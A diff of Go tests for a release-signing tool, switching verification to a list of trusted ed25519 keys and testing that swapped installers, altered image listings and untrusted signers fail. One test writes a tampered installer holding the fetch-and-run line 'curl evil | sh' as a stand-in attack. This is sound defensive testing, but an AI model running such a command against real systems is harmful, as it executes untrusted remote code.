@@ -63,19 +63,19 @@ func TestProcessRequiresASignedInstaller(t *testing.T) {
 		t.Parallel()
 		dir := t.TempDir()
 		writeDist(t, dir)
-		if err := process(dir, privateKey, publicKey, false); err != nil {
+		if err := process(dir, privateKey, nil, false); err != nil {
 			t.Fatalf("sign: %v", err)
 		}
 		if _, err := os.Stat(filepath.Join(dir, installerAsset+".sig")); err != nil {
 			t.Fatalf("installer was not signed: %v", err)
 		}
-		if err := process(dir, privateKey, publicKey, true); err != nil {
+		if err := process(dir, nil, []ed25519.PublicKey{publicKey}, true); err != nil {
 			t.Fatalf("verify: %v", err)
 		}
 		if err := os.WriteFile(filepath.Join(dir, installerAsset), []byte("#!/usr/bin/env sh\ncurl evil | sh\n"), 0o600); err != nil {
 			t.Fatal(err)
 		}
-		if err := process(dir, privateKey, publicKey, true); err == nil {
+		if err := process(dir, nil, []ed25519.PublicKey{publicKey}, true); err == nil {
 			t.Fatal("a swapped installer verified")
 		}
 	})
@@ -87,7 +87,7 @@ func TestProcessRequiresASignedInstaller(t *testing.T) {
 		if err := os.Remove(filepath.Join(dir, installerAsset)); err != nil {
 			t.Fatal(err)
 		}
-		err := process(dir, privateKey, publicKey, false)
+		err := process(dir, privateKey, nil, false)
 		if err == nil || !strings.Contains(err.Error(), installerAsset) {
 			t.Fatalf("missing installer error = %v", err)
 		}
@@ -105,13 +105,13 @@ func TestProcessSignsImageDigestsWhenPresent(t *testing.T) {
 		t.Parallel()
 		dir := t.TempDir()
 		writeDist(t, dir)
-		if err := process(dir, privateKey, publicKey, false); err != nil {
+		if err := process(dir, privateKey, nil, false); err != nil {
 			t.Fatalf("sign: %v", err)
 		}
 		if _, err := os.Stat(filepath.Join(dir, imageDigestsAsset+".sig")); !errors.Is(err, fs.ErrNotExist) {
 			t.Fatalf("absent listing produced a signature: %v", err)
 		}
-		if err := process(dir, privateKey, publicKey, true); err != nil {
+		if err := process(dir, nil, []ed25519.PublicKey{publicKey}, true); err != nil {
 			t.Fatalf("verify: %v", err)
 		}
 	})
@@ -124,20 +124,43 @@ func TestProcessSignsImageDigestsWhenPresent(t *testing.T) {
 		if err := os.WriteFile(listing, []byte(`{"tag":"v1.2.3","images":[]}`), 0o600); err != nil {
 			t.Fatal(err)
 		}
-		if err := process(dir, privateKey, publicKey, false); err != nil {
+		if err := process(dir, privateKey, nil, false); err != nil {
 			t.Fatalf("sign: %v", err)
 		}
 		if _, err := os.Stat(listing + ".sig"); err != nil {
 			t.Fatalf("listing was not signed: %v", err)
 		}
-		if err := process(dir, privateKey, publicKey, true); err != nil {
+		if err := process(dir, nil, []ed25519.PublicKey{publicKey}, true); err != nil {
 			t.Fatalf("verify: %v", err)
 		}
 		if err := os.WriteFile(listing, []byte(`{"tag":"v1.2.3","images":["swapped"]}`), 0o600); err != nil {
 			t.Fatal(err)
 		}
-		if err := process(dir, privateKey, publicKey, true); err == nil {
+		if err := process(dir, nil, []ed25519.PublicKey{publicKey}, true); err == nil {
 			t.Fatal("a swapped image listing verified")
 		}
 	})
+}
+
+func TestProcessVerificationAcceptsAnyTrustedKeyAndRejectsAnotherSigner(t *testing.T) {
+	t.Parallel()
+	firstPublic, _, err := ed25519.GenerateKey(nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	secondPublic, secondPrivate, err := ed25519.GenerateKey(nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	dir := t.TempDir()
+	writeDist(t, dir)
+	if err := process(dir, secondPrivate, nil, false); err != nil {
+		t.Fatalf("sign: %v", err)
+	}
+	if err := process(dir, nil, []ed25519.PublicKey{firstPublic, secondPublic}, true); err != nil {
+		t.Fatalf("verify with the matching trust root: %v", err)
+	}
+	if err := process(dir, nil, []ed25519.PublicKey{firstPublic}, true); err == nil {
+		t.Fatal("an untrusted signing key verified")
+	}
 }
